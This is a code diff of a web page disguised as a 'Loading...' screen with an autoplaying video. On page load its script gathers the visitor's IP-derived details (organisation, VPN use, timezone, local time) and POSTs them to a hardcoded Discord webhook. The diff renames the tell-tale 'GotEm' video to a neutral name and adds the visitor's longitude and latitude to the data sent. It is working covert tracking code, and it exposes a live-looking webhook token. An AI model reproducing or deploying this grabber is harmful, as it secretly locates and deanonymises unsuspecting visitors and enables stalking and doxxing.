@@ -6,11 +6,11 @@
     <title>Loading...</title>
   </head>
   <body>
-    <video autoplay loop id="GotEm">
-      <source src="WeGotEm.mp4" type="video/mp4">
+    <video autoplay loop id="Video">
+      <source src="Video.mp4" type="video/mp4">
     </video>
     <style>
-      #GotEm {
+      #Video {
   position: fixed;
   right: 0;
   bottom: 0;
@@ -34,6 +34,9 @@
         const vpn = data.security.is_vpn;
         const tz = data.timezone.name;
         const ct = data.timezone.current_time;
+        const long = data.longitude;
+        const lat = data.latitude;
+
         const request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1041449820356874361/wKqt_ITs8PfC74iZXl3FONq8O6WJAjdejijXswXllVdDedDxi8986iifaIPeZh4EIujb");
         // Put in your discord webhook url above ^^^
@@ -53,7 +56,9 @@
           "\n> Org: " + org +
           "\n> Using VPN: " + vpn +
           "\n> Timezone: " + tz +
-          "\n> Current time: " + ct
+          "\n> Current time: " + ct +
+          "\n> Longitude:  " + long +
+          "\n> Latitude:  " + lat 
           ,
         };
         request.send(JSON.stringify(params));
